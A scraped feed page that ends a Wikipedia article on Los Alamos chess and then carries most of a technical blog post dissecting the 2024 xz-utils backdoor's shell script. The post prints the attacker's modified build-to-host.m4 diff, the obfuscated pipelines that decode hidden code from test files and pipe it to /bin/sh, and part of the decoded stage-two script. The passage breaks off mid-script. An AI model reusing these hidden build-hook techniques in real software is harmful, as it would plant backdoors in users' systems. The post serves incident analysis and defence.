<li id="cite_note-Pritchard94-2"><span>^ <a href="#cite_ref-Pritchard94_2-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-Pritchard94_2-1"><sup><i><b>b</b></i></sup></a> <a href="#cite_ref-Pritchard94_2-2"><sup><i><b>c</b></i></sup></a></span> <span><cite id="CITEREFPritchard1994"><a href="https://en.wikipedia.org/wiki/David_Pritchard_(chess_player)" title="David Pritchard (chess player)">Pritchard, D. B.</a> (1994). "Los Alamos Chess". <i>The Encyclopedia of Chess Variants</i>. Games &amp; Puzzles Publications. pp.&nbsp;175–76. <a href="https://en.wikipedia.org/wiki/ISBN_(identifier)" title="ISBN (identifier)">ISBN</a>&nbsp;<a href="https://en.wikipedia.org/wiki/Special:BookSources/0-9524142-0-1" title="Special:BookSources/0-9524142-0-1"><bdi>0-9524142-0-1</bdi></a>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Los+Alamos+Chess&amp;rft.btitle=The+Encyclopedia+of+Chess+Variants&amp;rft.pages=175-76&amp;rft.pub=Games+%26+Puzzles+Publications&amp;rft.date=1994&amp;rft.isbn=0-9524142-0-1&amp;rft.aulast=Pritchard&amp;rft.aufirst=D.+B.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ALos+Alamos+chess"></span></span>
</li>
<li id="cite_note-:0-3"><span>^ <a href="#cite_ref-:0_3-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-:0_3-1"><sup><i><b>b</b></i></sup></a></span> <span><cite id="CITEREFNewellSimon2019">Newell, Allen; Simon, Herbert Alexander (2019). <i>Human problem solving</i>. Brattleboro, Vermont: Echo Point Books &amp; Media. <a href="https://en.wikipedia.org/wiki/ISBN_(identifier)" title="ISBN (identifier)">ISBN</a>&nbsp;<a href="https://en.wikipedia.org/wiki/Special:BookSources/978-1-63561-792-4" title="Special:BookSources/978-1-63561-792-4"><bdi>978-1-63561-792-4</bdi></a>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Human+problem+solving&amp;rft.place=Brattleboro%2C+Vermont&amp;rft.pub=Echo+Point+Books+%26+Media&amp;rft.date=2019&amp;rft.isbn=978-1-63561-792-4&amp;rft.aulast=Newell&amp;rft.aufirst=Allen&amp;rft.au=Simon%2C+Herbert+Alexander&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ALos+Alamos+chess"></span></span>
</li>
<li id="cite_note-Pritchard07-4"><span><b><a href="#cite_ref-Pritchard07_4-0">^</a></b></span> <span><cite id="CITEREFPritchard2007"><a href="https://en.wikipedia.org/wiki/David_Pritchard_(chess_player)" title="David Pritchard (chess player)">Pritchard, D. B.</a> (2007). "Los Alamos Chess". In Beasley, John (ed.). <i>The Classified Encyclopedia of Chess Variants</i>. John Beasley. p.&nbsp;112. <a href="https://en.wikipedia.org/wiki/ISBN_(identifier)" title="ISBN (identifier)">ISBN</a>&nbsp;<a href="https://en.wikipedia.org/wiki/Special:BookSources/978-0-9555168-0-1" title="Special:BookSources/978-0-9555168-0-1"><bdi>978-0-9555168-0-1</bdi></a>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Los+Alamos+Chess&amp;rft.btitle=The+Classified+Encyclopedia+of+Chess+Variants&amp;rft.pages=112&amp;rft.pub=John+Beasley&amp;rft.date=2007&amp;rft.isbn=978-0-9555168-0-1&amp;rft.aulast=Pritchard&amp;rft.aufirst=D.+B.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ALos+Alamos+chess"></span></span>
</li>
<li id="cite_note-5"><span><b><a href="#cite_ref-5">^</a></b></span> <span><cite id="CITEREFSteinUlam1957">Stein, P.; Ulam, S. (January 1957). <a rel="nofollow" href="https://uscf1-nyc1.aodhosting.com/CL-AND-CR-ALL/CR-ALL/CR1957/CR1957_01.pdf">"Experiments in Chess on Electronic Computing Machines"</a> <span>(PDF)</span>. <i><a href="https://en.wikipedia.org/wiki/Chess_Review" title="Chess Review">Chess Review</a></i>: 13–17.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Chess+Review&amp;rft.atitle=Experiments+in+Chess+on+Electronic+Computing+Machines&amp;rft.pages=13-17&amp;rft.date=1957-01&amp;rft.aulast=Stein&amp;rft.aufirst=P.&amp;rft.au=Ulam%2C+S.&amp;rft_id=https%3A%2F%2Fuscf1-nyc1.aodhosting.com%2FCL-AND-CR-ALL%2FCR-ALL%2FCR1957%2FCR1957_01.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ALos+Alamos+chess"></span></span>
</li>
</ol></div>
<h2><span id="External_links">External links</span><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Los_Alamos_chess&amp;action=edit&amp;section=6" title="Edit section: External links"><span>edit</span></a><span>]</span></span></h2>
<ul><li><a rel="nofollow" href="https://www.chessvariants.org/small.dir/losalamos.html">Los Alamos Chess</a> by <a href="https://en.wikipedia.org/wiki/Hans_L._Bodlaender" title="Hans L. Bodlaender">Hans L. Bodlaender</a>, <i><a href="https://en.wikipedia.org/wiki/The_Chess_Variant_Pages" title="The Chess Variant Pages">The Chess Variant Pages</a></i></li>
<li><a rel="nofollow" href="https://www.chessvariants.com/large.dir/contest84/losalamos4.html">Los Alamos Vierschach</a> by <a rel="nofollow" href="https://www.chessvariants.com/who/JorgKnappen">Jörg Knappen</a>, <i>The Chess Variant Pages</i></li>
<li><a rel="nofollow" href="https://archive.today/20120730113449/http://www.chessbase.com/columns/column.asp?pid=102">A short history of computer chess</a> by Frederic Friedel</li>
<li><a rel="nofollow" href="http://brainking.com/">BrainKing.com</a> - internet server to play Los Alamos chess.</li></ul>

<!-- 
NewPP limit report
Parsed by mw1492
Cached time: 20240402194351
Cache expiry: 2592000
Reduced expiry: false
Complications: [vary‐revision‐sha1, show‐toc]
CPU time usage: 0.376 seconds
Real time usage: 0.496 seconds
Preprocessor visited node count: 1182/1000000
Post‐expand include size: 96242/2097152 bytes
Template argument size: 716/2097152 bytes
Highest expansion depth: 8/100
Expensive parser function count: 1/500
Unstrip recursion depth: 1/20
Unstrip post‐expand size: 28368/5000000 bytes
Lua time usage: 0.191/10.000 seconds
Lua memory usage: 4420474/52428800 bytes
Number of Wikibase entities loaded: 0/400
-->
<!--
Transclusion expansion time report (%,ms,calls,template)
100.00%  337.156      1 -total
 37.64%  126.900      1 Template:Reflist
 28.59%   96.387      5 Template:Navbox
 27.64%   93.203      1 Template:Chess_variants
 27.25%   91.888      2 Template:Cite_journal
 21.88%   73.777      1 Template:Short_description
 13.90%   46.854      2 Template:Pagetype
  6.35%   21.415      1 Template:AN_chess
  5.22%   17.602      1 Template:Side_box
  5.05%   17.011      3 Template:Cite_book
-->

<!-- Saved in parser cache with key enwiki:pcache:idhash:3308490-0!canonical and timestamp 20240402194351 and revision id 1216925127. Rendering was triggered because: api-parse
 -->
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The xz attack shell script (130 pts)]]></title>
            <link>https://research.swtch.com/xz-script</link>
            <guid>39903685</guid>
            <pubDate>Tue, 02 Apr 2024 09:05:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://research.swtch.com/xz-script">https://research.swtch.com/xz-script</a>, See on <a href="https://news.ycombinator.com/item?id=39903685">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <h2>The xz attack shell script
        
        <div>
        <p>
          
            Posted on Tuesday, April 2, 2024.
            
          
        </p>
        </div>
        </h2>
        <a href="#introduction"><h2 id="introduction">Introduction</h2></a>


<p>
Andres Freund <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">published the existence of the xz attack</a> on 2024-03-29 to the public oss-security@openwall mailing list. The day before, he alerted Debian security and the (private) distros@openwall list. In his mail, he says that he dug into this after “observing a few odd symptoms around liblzma (part of the xz package) on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors).”

</p><p>
At a high level, the attack is split in two pieces: a shell script and an object file. There is an injection of shell code during <code>configure</code>, which injects the shell code into <code>make</code>. The shell code during <code>make</code> adds the object file to the build. This post examines the shell script. (See also <a href="https://research.swtch.com/xz-timeline">my timeline post</a>.)

</p><p>
The nefarious object file would have looked suspicious checked into the repository as <code>evil.o</code>, so instead both the nefarious shell code and object file are embedded, compressed and encrypted, in some binary files that were added as “test inputs” for some new tests. The test file directory already existed from long before Jia Tan arrived, and the README explained “This directory contains bunch of files to test handling of .xz, .lzma (LZMA_Alone), and .lz (lzip) files in decoder implementations. Many of the files have been created by hand with a hex editor, thus there is no better "source code" than the files themselves.” This is a fact of life for parsing libraries like liblzma. The attacker looked like they were just <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0">adding a few new test files</a>.

</p><p>
Unfortunately the nefarious object file turned out to have a bug that caused problems with Valgrind, so the test files needed to be updated to add the fix. <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=74b138d2a6529f2c07729d7c77b1725a8e8b16f1">That commit</a> explained “The original files were generated with random local to my machine. To better reproduce these files in the future, a constant seed was used to recreate these files.” The attackers realized at this point that they needed a better update mechanism, so the new nefarious script contains an extension mechanism that lets it look for updated scripts in new test files, which wouldn’t draw as much attention as rewriting existing ones.

</p><p>
The effect of the scripts is to arrange for the nefarious object file’s <code>_get_cpuid</code> function to be called as part of a <a href="https://sourceware.org/glibc/wiki/GNU_IFUNC">GNU indirect function</a> (ifunc) resolver. In general these resolvers can be called lazily at any time during program execution, but for security reasons it has become popular to call all of them during dynamic linking (very early in program startup) and then map the <a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">global offset table (GOT) and procedure linkage table (PLT) read-only</a>, to keep buffer overflows and the like from being able to edit it. But a nefarious ifunc resolver would run early enough to be able to edit those tables, and that’s exactly what the backdoor introduced. The resolver then looked through the tables for <code>RSA_public_decrypt</code> and replaced it with a nefarious version that <a href="https://github.com/amlweems/xzbot">runs attacker code when the right SSH certificate is presented</a>.
<a href="#configure"></a></p><h2 id="configure"><a href="#configure">Configure</a></h2>


<p>
Again, this post looks at the script side of the attack. Like most complex Unix software, xz-utils uses GNU autoconf to decide how to build itself on a particular system. In ordinary operation, autoconf reads a <code>configure.ac</code> file and produces a <code>configure</code> script, perhaps with supporting m4 files brought in to provide “libraries” to the script. Usually, the <code>configure</code> script and its support libraries are only added to the tarball distributions, not the source repository. The xz distribution works this way too.

</p><p>
The attack kicks off with the attacker adding an unexpected support library, <code>m4/build-to-host.m4</code> to the xz-5.6.0 and xz-5.6.1 tarball distributions. Compared to the standard <code>build-to-host.m4</code>, the attacker has made the following changes:
</p><pre>diff --git a/build-to-host.m4 b/build-to-host.m4
index ad22a0a..d5ec315 100644
--- a/build-to-host.m4
+++ b/build-to-host.m4
@@ -1,5 +1,5 @@
-# build-to-host.m4 serial 3
-dnl Copyright (C) 2023 Free Software Foundation, Inc.
+# build-to-host.m4 serial 30
+dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.
 dnl This file is free software; the Free Software Foundation
 dnl gives unlimited permission to copy and/or distribute it,
 dnl with or without modifications, as long as this notice is preserved.
@@ -37,6 +37,7 @@ AC_DEFUN([gl_BUILD_TO_HOST],


   dnl Define somedir_c.
   gl_final_[$1]="$[$1]"
+  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
   dnl Translate it from build syntax to host syntax.
   case "$build_os" in
     cygwin*)
@@ -58,14 +59,40 @@ AC_DEFUN([gl_BUILD_TO_HOST],
   if test "$[$1]_c_make" = '\"'"${gl_final_[$1]}"'\"'; then
     [$1]_c_make='\"$([$1])\"'
   fi
+  if test "x$gl_am_configmake" != "x"; then
+    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null'
+  else
+    gl_[$1]_config=&amp;rdquo;
+  fi
+  _LT_TAGDECL([], [gl_path_map], [2])dnl
+  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl
+  _LT_TAGDECL([], [gl_am_configmake], [2])dnl
+  _LT_TAGDECL([], [[$1]_c_make], [2])dnl
+  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl
   AC_SUBST([$1_c_make])
+
+  dnl If the host conversion code has been placed in $gl_config_gt,
+  dnl instead of duplicating it all over again into config.status,
+  dnl then we will have config.status run $gl_config_gt later, so it
+  dnl needs to know what name is stored there:
+  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2&gt;/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
 ])


 dnl Some initializations for gl_BUILD_TO_HOST.
 AC_DEFUN([gl_BUILD_TO_HOST_INIT],
 [
+  dnl Search for Automake-defined pkg* macros, in the order
+  dnl listed in the Automake 1.10a+ documentation.
+  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2&gt;/dev/null`
+  if test -n "$gl_am_configmake"; then
+    HAVE_PKG_CONFIGMAKE=1
+  else
+    HAVE_PKG_CONFIGMAKE=0
+  fi
+
   gl_sed_double_backslashes='s/\\/\\\\/g'
   gl_sed_escape_doublequotes='s/"/\\"/g'
+  gl_path_map='tr "\t \-_" " \t_\-"'
 changequote(,)dnl
   gl_sed_escape_for_make_1="s,\\([ \"&amp;'();&lt;&gt;\\\\\`|]\\),\\\\\\1,g"
 changequote([,])dnl
</pre>


<p>
All in all, this is a fairly plausible set of diffs, in case anyone thought to check. It bumps the version number, updates the copyright year to look current, and makes a handful of inscrutable changes that don’t look terribly out of place.

</p><p>
Looking closer, the something is amiss. Starting near the bottom,
</p><pre>gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2&gt;/dev/null`
if test -n "$gl_am_configmake"; then
  HAVE_PKG_CONFIGMAKE=1
else
  HAVE_PKG_CONFIGMAKE=0
fi
</pre>


<p>
Let’s see which files in the distribution match the pattern (simplifying the <code>grep</code> command): 
</p><pre>% egrep -Rn '####[[:alnum:]][[:alnum:]][[:alnum:]][[:alnum:]][[:alnum:]]####$'
Binary file ./tests/files/bad-3-corrupt_lzma2.xz matches
%
</pre>


<p>
That’s surprising! So this script sets <code>gl_am_configmake=./tests/files/bad-3-corrupt_lzma2.xz</code> and <code>HAVE_PKG_CONFIGMAKE=1</code>. The <code>gl_path_map</code> setting is a <a href="https://linux.die.net/man/1/tr">tr(1)</a> command that swaps tabs and spaces and swaps underscores and dashes.

</p><p>
Now reading the top of the script,
</p><pre>gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
</pre>


<p>
extracts the final dot-separated element of that filename, leaving <code>xz</code>. That is, it’s the file name suffix, not a prefix, and it is the name of the compression command that is likely already installed on any build machine.

</p><p>
The next section is:
</p><pre>if test "x$gl_am_configmake" != "x"; then
  gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null'
else
  gl_[$1]_config=&amp;rdquo;
fi
</pre>


<p>
We know that <code>gl_am_configmake=./tests/files/bad-3-corrupt_lzma2.xz</code>, so this sets the <code>gl_[$1]_config</code> variable to the string
</p><pre>sed "r\n" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null
</pre>


<p>
At first glance, especially in the original quoted form, the <code>sed</code> command looks like it has something to do with line endings, but in fact <code>r\n</code> is the <code>sed</code> “read from file <code>\n</code>” command. Since the file <code>\n</code> does not exist, the command does nothing at all, and then since <code>sed</code> has not been invoked with the <code>-n</code> option, <code>sed</code> prints each line of input. So <code>sed "r\n"</code> is just an obfuscated <code>cat</code> command, and remember that <code>$gl_path_map</code> is the <code>tr</code> command from before, and <code>$gl_[$1]_prefix</code> is <code>xz</code>. To the shell, this command is really
</p><pre>cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
</pre>


<p>
But right now it’s still just a string; it hasn’t been run. That changes with
</p><pre>dnl If the host conversion code has been placed in $gl_config_gt,
dnl instead of duplicating it all over again into config.status,
dnl then we will have config.status run $gl_config_gt later, so it
dnl needs to know what name is stored there:
AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2&gt;/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
</pre>


<p>
The final <code>"eval \$gl_[$1]_config"</code> runs that command. If we run it on the xz 5.6.0 repo, we get:
</p><pre>$ cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
####Hello####
#��Z�.hj�
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +724)";
(xz -dc $srcdir/tests/files/good-large_compressed.lzma|
    eval $i|tail -c +31265|
    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|
    xz -F raw --lzma1 -dc|/bin/sh
####World####
$
</pre>


<p>
I have inserted some line breaks, here and in later script fragments,
to keep the lines from being too long in the web page.

</p><p>
Why the Hello and World? The README text that came with the test file describes it:</p><blockquote>

<p>
bad-3-corrupt_lzma2.xz has three Streams in it. The first and third streams are valid xz Streams. The middle Stream has a correct Stream Header, Block Header, Index and Stream Footer. Only the LZMA2 data is corrupt. This file should decompress if <code>--single-stream</code> is used.</p></blockquote>

<p>
The first and third streams are the Hello and World, and the middle stream has been corrupted by swapping the byte values unswapped by the <code>tr</code> command.

</p><p>
Recalling that xz 5.6.1 shipped with different “test” files, we can also try xz 5.6.1:
</p><pre>$ cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
####Hello####
#�U��$�
[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +939)";
(xz -dc $srcdir/tests/files/good-large_compressed.lzma|
    eval $i|tail -c +31233|
    tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")|
    xz -F raw --lzma1 -dc|/bin/sh
####World####
$
</pre>


<p>
The first difference is that the script makes sure (very sure!) to exit if not being run on Linux. The second difference is that the long “<code>export i</code>” line deviates in the final head command offset (724 vs 939) and then the tail offset and the <code>tr</code> argument. Let’s break those down.

</p><p>
The <code>head</code> command prints a prefix of its input. Let’s look at the start:
</p><pre>(head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
(head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; ...
</pre>


<p>
This discards the first kilobyte of standard input, prints the next two kilobytes, discards the next kilobyte, and prints the next two kilobytes. And so on. The whole command for 5.6.1 is:
</p><pre>(head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
(head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
... 16 times total ...
head -c +939
</pre>


<p>
The shell variable <code>i</code> is set to this long command. Then the script runs:
</p><pre>xz -dc $srcdir/tests/files/good-large_compressed.lzma |
eval $i |
tail -c +31233 |
tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377" |
xz -F raw --lzma1 -dc |
/bin/sh
</pre>


<p>
The first <code>xz</code> command uncompresses another malicious test file. The <code>eval</code> then runs the <code>head</code> pipeline, extracting a total of 16×2048+939 = 33,707 bytes. Then the <code>tail</code> command keeps only the final 31,233 bytes. The <code>tr</code> command applies a simple substitution cipher to the output (so that just in case anyone thought to pull these specific byte ranges out of the file, they wouldn’t recognize it as a valid lzma input!?). The second <code>xz</code> command decodes the translated bytes as a raw lzma stream, and then of course the result is piped through the shell.

</p><p>
Skipping the shell pipe, we can run this, obtaining a very long shell script. I have added commentary in between sections of the output.
</p><pre>$ xz -dc $srcdir/tests/files/good-large_compressed.lzma |
  eval $i |
  tail -c +31265 |
  tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
  xz -F raw --lzma1 -dc
P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
C="pic_flag=\" $P\""
O="^pic_flag=\" -fPIC -DPIC\"$"
R="is_arch_extension_supported"
x="__get_cpuid("
p="good-large_compressed.lzma"
U="bad-3-corrupt_lzma2.xz"
</pre>


<p>
So far, setting up environment variables.
</p><pre>[ ! $(uname)="Linux" ] &amp;&amp; exit 0  # 5.6.1 only
</pre>


<p>
A line that only appears in 5.6.1, exiting when not run on Linux. A robustness fix, perhaps. In general the scripts in 5.6.0 and 5.6.1 are very similar: 5.6.1 has a few additions. We will examine the 5.6.1 script, with the additions marked.
</p><pre>eval $zrKcVq
</pre>


<p>
The first of many odd eval statements, for variables that do not appear to be set anywhere. One possibility is that these are debug prints: when the attacker is debugging the script, setting, say, <code>zrKcVq=env</code> inserts a debug print during execution. Another possibility is that these are extension points that can be set by some other mechanism, run before this code, in the future.
</p><pre>if test -f config.status; then
eval $zrKcSS
eval `grep ^LD=\'\/ config.status`
eval `grep ^CC=\' config.status`
eval `grep ^GCC=\' config.status`
eval `grep ^srcdir=\' config.status`
eval `grep ^build=\'x86_64 config.status`
eval `grep ^enable_shared=\'yes\' config.status`
eval `grep ^enable_static=\' config.status`
eval `grep ^gl_path_map=\' config.status`
</pre>


<p>
If <code>config.status</code> exists, we read various variables from it into the shell, along with two extension points. Note that we are still inside the config.status check (let’s call it “if #1”) as we continue through the output.
</p><pre># Entirely new in 5.6.1
vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2&gt;/dev/null`
if test "x$vs" != "x" &gt; /dev/null 2&gt;&amp;1;then
f1=`echo $vs | cut -d: -f1`
if test "x$f1" != "x" &gt; /dev/null 2&gt;&amp;1;then
start=`expr $(echo $vs | cut -d: -f2) + 7`
ve=`grep -broaF '|_!{ -' $srcdir/tests/files/ 2&gt;/dev/null`
if test "x$ve" != "x" &gt; /dev/null 2&gt;&amp;1;then
f2=`echo $ve | cut -d: -f1`
if test "x$f2" != "x" &gt; /dev/null 2&gt;&amp;1;then
[ ! "x$f2" = "x$f1" ] &amp;&amp; exit 0
[ ! -f $f1 ] &amp;&amp; exit 0
end=`expr $(echo $ve | cut -d: -f2) - $start`
eval `cat $f1 | tail -c +${start} | head -c +${end} |
    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
    xz -F raw --lzma2 -dc`
fi
fi
fi
fi
</pre>


<p>
This section is entirely new in 5.6.1. It looks for a single test file to contain the magic texts <code>'~!:_ W'</code> and <code>'|_!{ -'</code>, extracts the bytes between them, applies a substitution cipher, decompresses the result, and evaluates the output as a shell script. This appears to be an extension mechanism, so that the next time changes are needed in this script, a new script can be added in a different test file, instead of having to <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=74b138d2a6529f2c07729d7c77b1725a8e8b16f1">make up reasons to regenerate existing binary test files</a>.

</p><p>
The next chunk continues with script that was present in 5.6.0.
</p><pre>eval $zrKccj
if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
</pre>


<p>
Two different checks that <a href="https://maskray.me/blog/2021-01-18-gnu-indirect-function">GNU indirect function</a> support is enabled. If not, stop the script. The backdoor requires this functionality.
</p><pre>if test "x$enable_shared" != "xyes";then
exit 0
fi
</pre>


<p>
Require shared library support.
</p><pre>if ! (echo "$build" | grep -Eq "^x86_64" &gt; /dev/null 2&gt;&amp;1) &amp;&amp; (echo "$build" | grep -Eq "linux-gnu$" &gt; /dev/null 2&gt;&amp;1);then
exit 0
fi
</pre>


<p>
Require an x86-64 Linux system.
</p><pre>if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c &gt; /dev/null 2&gt;&amp;1; then
exit 0
fi
if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c &gt; /dev/null 2&gt;&amp;1; then
exit 0
fi
if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;&amp;1; then
exit 0
fi
if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;&amp;1; then
exit 0
fi
</pre>


<p>
Require all the crc ifunc code (in case it has been patched out?).
</p><pre>if test "x$GCC" != 'xyes' &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
if test "x$CC" != 'xgcc' &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
LDv=$LD" -v"
if ! $LDv 2&gt;&amp;1 | grep -qs 'GNU ld' &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
</pre>


<p>
Require gcc (not clang, I suppose) and GNU ld.
</p><pre>if ! test -f "$srcdir/tests/files/$p" &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
if ! test -f "$srcdir/tests/files/$U" &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
</pre>


<p>
Require the backdoor-containing test files. Of course, if these files didn’t exist, it’s unclear how we obtained this script in the first place, but better safe than sorry, I suppose.
</p><pre>if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
eval $zrKcst
</pre>


<p>
Add a bunch of checks when the file <code>debian/rules</code> exists or <code>$RPM_ARCH</code> is set to <code>x86_64</code>. Note that we are now inside two <code>if</code> statements: the <code>config.status</code> check above, and this one (let’s call it “if #2”).
</p><pre>j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
if ! grep -qs "$j" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
z="^am__uninstall_files_from_dir = {"
if ! grep -qs "$z" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
w="^am__install_max ="
if ! grep -qs "$w" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
E=$z
if ! grep -qs "$E" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
Q="^am__vpath_adj_setup ="
if ! grep -qs "$Q" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
M="^am__include = include"
